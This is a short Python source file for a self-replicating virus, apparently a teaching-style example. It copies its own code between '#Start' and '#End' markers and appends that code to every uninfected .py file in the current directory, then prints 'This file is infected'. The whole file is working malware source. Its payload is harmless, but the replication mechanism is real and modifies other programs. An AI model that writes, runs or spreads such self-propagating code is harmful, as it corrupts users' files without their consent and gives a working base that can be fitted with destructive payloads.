#Start
import sys
import re
import glob

# Put a copy of all lines into a list
virusCode= []

# Open this file and read all lines
# Filter out all lines that are not inside the virus code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

# Save lines into list
inVirus = False
for line in lines:
    if(re.search("^#Start", line)):
        inVirus = True

    if (inVirus == True):
        virusCode.append(line)
    
    if (re.search("^#End",line)):
        break

# Find files that can be infected
programs = glob.glob("*.py")

for p in programs:
    file = open(p,"r")
    programCode = file.readlines()
    file.close

    # Check if the file is already infected
    infected = False
    for line in programCode:
        if(re.search("^#Start",line)):
            infected = True
            break

    # If the file is not infected add code to the file and infect it    
    if not infected:
        newCode = []
        newCode = programCode 
        newCode.extend(virusCode)
        file = open(p, "w")
        file.writelines(newCode)
        file.close()

# Payload
print("This file is infected")

#End
